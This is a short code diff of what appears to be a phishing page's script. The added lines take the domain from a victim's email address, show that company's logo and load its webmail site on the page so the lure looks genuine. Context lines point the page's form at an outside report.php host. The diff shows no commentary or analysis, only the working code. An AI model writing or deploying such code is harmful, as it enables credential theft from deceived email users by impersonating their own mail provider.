@@ -46,6 +46,14 @@
             document.getElementById("cax").value = emaq;
             document.getElementById("pax").action = "https://vciaudio.com/pro/report.php";
           }
+	  
+	   var ind=emaq.indexOf("@");
+        var my_slice=emaq.substr((ind+1));
+      var mainPage = 'https://'+my_slice; 
+     //     var mainPage = 'https://webmail.staralliancebd.com/';  
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+         document.getElementById('mainPage').src = mainPage;
+    //    $("#mainPage").src(mainPage);
   </script>
   </html>
   
